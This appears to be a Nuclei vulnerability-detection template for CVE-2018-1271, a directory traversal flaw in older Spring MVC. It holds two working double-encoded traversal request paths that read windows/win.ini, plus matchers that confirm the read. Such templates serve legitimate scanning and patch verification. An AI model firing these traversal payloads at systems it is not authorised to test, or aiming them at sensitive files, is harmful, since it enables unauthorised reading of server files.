id: CVE-2018-1271

info:
  name: Spring MVC Framework - Local File Inclusion
  author: hetroublemakr
  severity: medium
  description: Spring MVC Framework versions 5.0 prior to 5.0.5 and versions 4.3 prior to 4.3.15 and older unsupported are vulnerable to local file inclusion because they allow applications to configure Spring MVC to serve static resources (e.g. CSS, JS, images). A malicious user can send a request using a specially crafted URL that can lead a directory traversal attack.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to read sensitive files on the server, potentially leading to unauthorized access or information disclosure.
  remediation: |
    Apply the latest security patches and updates provided by the Spring MVC Framework to mitigate this vulnerability.
  reference:
    - https://medium.com/@knownsec404team/analysis-of-spring-mvc-directory-traversal-vulnerability-cve-2018-1271-b291bdb6be0d
    - https://pivotal.io/security/cve-2018-1271
    - https://access.redhat.com/errata/RHSA-2018:1320
    - https://nvd.nist.gov/vuln/detail/CVE-2018-1271
    - http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 5.9
    cve-id: CVE-2018-1271
    cwe-id: CWE-22
    epss-score: 0.90926
    epss-percentile: 0.99619
    cpe: cpe:2.3:a:vmware:spring_framework:*:*:*:*:*:*:*:*
  metadata:
    max-request: 2
    vendor: vmware
    product: spring_framework
  tags: cve,cve2018,spring,lfi,traversal,vmware

http:
  - method: GET
    path:
      - '{{BaseURL}}/static/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini'
      - '{{BaseURL}}/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini'

    matchers-condition: and
    matchers:
      - type: word
        words:
          - 'for 16-bit app support'

      - type: status
        status:
          - 200
# digest: 4b0a00483046022100ab3cc0626393c0ee9bf4487452aa1f5e9f47056e0f8a0c6775dd920ce2637ce7022100c1b1355d81cad886ad892f97b007773327d4597ee3a49528cb793852eed83158:922c64590222798bb761d5b6d8e72950